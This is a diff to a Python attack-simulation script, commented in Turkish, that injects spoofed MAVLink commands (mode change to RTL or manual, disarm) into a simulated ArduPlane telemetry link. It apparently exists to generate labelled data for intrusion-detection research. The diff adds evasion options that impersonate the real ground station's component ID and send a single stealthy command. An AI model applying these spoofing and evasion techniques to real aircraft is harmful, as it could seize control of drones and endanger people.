@@ -7,6 +7,14 @@ proxy'nin telsiz kanalına (UDP 14550) TEHLİKELİ bir COMMAND_LONG enjekte
 eder — ör. mod değişikliği veya disarm. Amaç, otopilotu meşru olmayan bir
 komutla manipüle etmeye çalışan bir saldırganı taklit etmektir.
 
+Varsayılan komut mod_rtl'dir: Uçağın modunu gerçekten değiştirir. disarm uçuşta
+ArduPlane tarafından reddedilir, yalnızca reddedilen deneme verisi üretir.
+
+Varyantlar:
+    --taklit-compid : Gerçek yer istasyonuyla aynı sysid + compid kullanır. Yoksa
+                      yanlış compid kural katmanına anında takılır.
+    --tek-atis      : Tek komut gönderir (en sinsi durum). Tekrar izi bırakmaz.
+
 GÜVENLİK: Yalnızca 127.0.0.1 hedefine bağlanır (saldiri_temel üzerinden
 zorlanır). Bu betik yalnızca kendi simülasyonumuz içindir.
 
@@ -24,18 +32,28 @@ import ortak
 from pymavlink import mavutil
 
 
+GCS_COMPID = 0          # ucus_yap.py'nin (gerçek yer istasyonu) compid'i
+SALDIRGAN_COMPID = 190
+
+
 def main() -> int:
     ap = st.temel_arg_parser(__doc__)
     ap.add_argument(
         "--komut",
-        default="disarm",
+        default="mod_rtl",
         choices=["disarm", "mod_rtl", "mod_manual"],
         help="Enjekte edilecek sahte komut türü.",
     )
+    ap.add_argument("--taklit-compid", action="store_true",
+                    help="Gerçek yer istasyonunun compid'ini kullan.")
+    ap.add_argument("--tek-atis", action="store_true", help="Yalnızca tek komut gönder.")
     args = ap.parse_args()
 
     cfg = ortak.config_oku()
-    baglanti = st.gonderen_kur(cfg, source_system=255, source_component=190)
+    baglanti = st.gonderen_kur(
+        cfg, source_system=255,
+        source_component=GCS_COMPID if args.taklit_compid else SALDIRGAN_COMPID,
+    )
 
     st.baslangic_gecikmesi_bekle(args.baslangic_gecikme)
 
@@ -68,6 +86,9 @@ def main() -> int:
         gonderilen += 1
         if attacker_addr is None:
             attacker_addr = st.attacker_addr_al(baglanti, cfg)
+        if args.tek_atis:
+            time.sleep(1.0)  # paket kaydedilmeden aralık kapanmasın
+            break
         time.sleep(0.5)  # saniyede ~2 sahte komut
 
     end_ns = ortak.simdi_ns()
@@ -76,7 +97,8 @@ def main() -> int:
     st.ground_truth_yaz(
         args.ucus, "spoof_cmd", start_ns, end_ns,
         attacker_addr or f"{cfg.get('host')}:?",
-        {"komut": args.komut, "sysid": 255, "gonderilen": gonderilen}, cfg,
+        {"komut": args.komut, "sysid": 255, "gonderilen": gonderilen,
+         "taklit_compid": args.taklit_compid, "tek_atis": args.tek_atis}, cfg,
     )
     baglanti.close()
     return 0
